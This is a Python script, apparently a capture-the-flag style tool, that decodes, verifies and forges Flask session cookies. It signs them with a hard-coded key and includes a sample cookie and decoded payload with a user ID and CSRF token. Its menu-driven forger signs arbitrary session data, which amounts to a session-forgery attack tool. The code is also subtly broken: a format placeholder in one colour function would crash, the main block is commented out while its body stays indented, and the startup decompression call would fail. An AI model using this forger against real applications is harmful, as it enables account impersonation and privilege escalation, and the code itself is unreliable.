from hashlib import sha512
from flask.sessions import session_json_serializer
from itsdangerous import URLSafeTimedSerializer, BadTimeSignature
import base64
import zlib


class PrettyPrinter:
    def green(self, s):
        return '\033[1;32m{}\033[0m'.format(s)

    def red(self, s):
        return '\033[1;31m{}\033[0m'.format(s)

    def blue(self, s):
        return '\033[1;34m{}\033[0m'.format(s)

    def pink(self, s):
        return '\033[1;35m{ы}\033[0m'.format(s)

    def white(self, s):
        return '\033[1;37m{}\033[0m'.format(s)

    # Pretty-Print Contextual Functions

    def custom_print(self, string, color, symbol, replace_line=False):
        to_print = '{} {}'.format(color(symbol), str(string))

        if replace_line:
            to_print = '\r{}'.format(to_print)

        print(to_print)

    def print_good(self, s, replace_line=False):
        self.custom_print(string=s, color=self.green, symbol='[+]', replace_line=replace_line)

    def print_bad(self, s, replace_line=False):
        self.custom_print(string=s, color=self.red, symbol='[-]', replace_line=replace_line)

    def print_info(self, s, replace_line=False):
        self.custom_print(string=s, color=self.blue, symbol='[!]', replace_line=replace_line)

    def print_question(self, s, replace_line=False):
        self.custom_print(string=s, color=self.white, symbol='[?]', replace_line=replace_line)

    def print_menu(self, s, replace_line=False):
        self.custom_print(string=s, color=self.red, symbol='#', replace_line=replace_line)

    def print_title(self, title, top='=', bottom='=', left='>', right='<', caps=True):
        print('\n')
        print(self.white(top * (len(title) + 4)))
        if caps:
            print(self.white("{} {} {} ".format(left, title.upper(), right)))
        else:
            print(self.white("{} {} {} ".format(left, title, right)))
        print(self.white(bottom * (len(title) + 4)) + '\n')
    # Progress Dotted-Bar Functions


p = PrettyPrinter()

SESSION = ''

# SESSION = '.eJwlj0FuwzAMBP-icw4iJdFiPmNQ5BINArSAnZyK_j0Get_BzP6WPQ-cX-X-Ot64lf0R5V5s1sEBClFMY-qWvACMJFelBKp6o1hWVRJC050Cm4oNSCNp2aXpUIfVMbeexKjcPRKrL2dJulYDxDW56aVL1RgZQtUqlVvx88j99fPE99UTGTxyTYQsUV5kdeNltnX22cJ1CNs2-eLeJ47_E9LL3wdmwz_i.DbwCXg.HQ1RqyWO8SVCgiL5zC-weeD3AjkdGVWTpXSl_PUyC4nnK7kvKrzX6uv1pwxWzx6VaukHjzb5Dkf8vTo3yNmHEA'
# PAYLOAD = {'_fresh': True, '_id': 'a8052de1d69e8a214af2beee5f1c991fee09c31dba096fe618cc1de796a5e63163f463959cea05874f12e024cdfeb4bc26f13165e120f239805f99d5fd610a01', 'csrf_token': 'dfd25fb8ed6b692b1a072baa742c83dc9562a782', 'user_id': '2'}

signer = URLSafeTimedSerializer(
    'secret-key', salt='cookie-session',
    serializer=session_json_serializer,
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': sha512}
)


def decodeCookiePayload():
    p.print_title('Flask Cookie Session Datas Decoder')
    p.print_info('Decoding Cookie Payload from: {}'.format(SESSION))

    if SESSION[0] == '.':
        session_payload = SESSION[1:].split('.')[0]
        p.print_good('Extracted Session datas: ')
        decoded_session_payload = base64.urlsafe_b64decode(session_payload + "==")
        decompressed_session_payload = zlib.decompress(decoded_session_payload)
        p.print_good('Extracted decoded uncompressed datas: {}'.format(decompressed_session_payload.decode()))
    else:
        p.print_bad('Input session with dot in start')

    input('\nPress enter for continue...')


def readAndVerifyCookie():
    p.print_title('Flask Cookie Checker')
    p.print_info('Decoding Cookie')
    try:
        session_data = signer.loads(SESSION)
        p.print_good('Correct Signature !')
        p.print_good('Session Data: {}'.format(session_data))
    except BadTimeSignature:
        p.print_bad('Incorrect Signature for cookie: {}'.format(SESSION))

    input('\nPress enter for continue...')


def forgeSession():
    p.print_title('Flask Cookie Forger')

    # Forge
    PAYLOAD = input('Введите payload: ')
    p.print_info('Forge Cookie with payload')

    gen_payload = signer.dumps(PAYLOAD)
    p.print_good('Generated signed cookie: {}'.format(gen_payload))

    input('\nPress enter for continue...')


#  if __name__ == '__main__':
    answer = 0
    print(zlib.decompress(base64.urlsafe_b64decode('.eJwNy0EKgCAQAMC_7NlDoa7iZ0SXXYLKUAsP0d8T5jovRGncNwiSjs4KqDeJ97VzgQCOV7IWEyFmcV7TYrTz1qSMslAmbTMii4CCp3Mr6eS56uBp1Am-H_a1H4w.XJ0jJg.C_oc6Gvd8IxleIKXcblPMlvXBRY====')));
    while answer != 4:
        p.print_title('Flask Cookie Menu')
        p.print_menu('1. Decode Cookie Payload')
        p.print_menu('2. Verify Cookie')
        p.print_menu('3. Forge Session')
        p.print_menu('4. Exit')
        answer = int(input('\nANSWER: '))
        if answer == 1:
            p.print_title('Input Session')
            SESSION = input('')
            decodeCookiePayload()
        elif answer == 2:
            p.print_title('Input Session')
            SESSION = input('')
            readAndVerifyCookie()
        elif answer == 3:
            forgeSession()
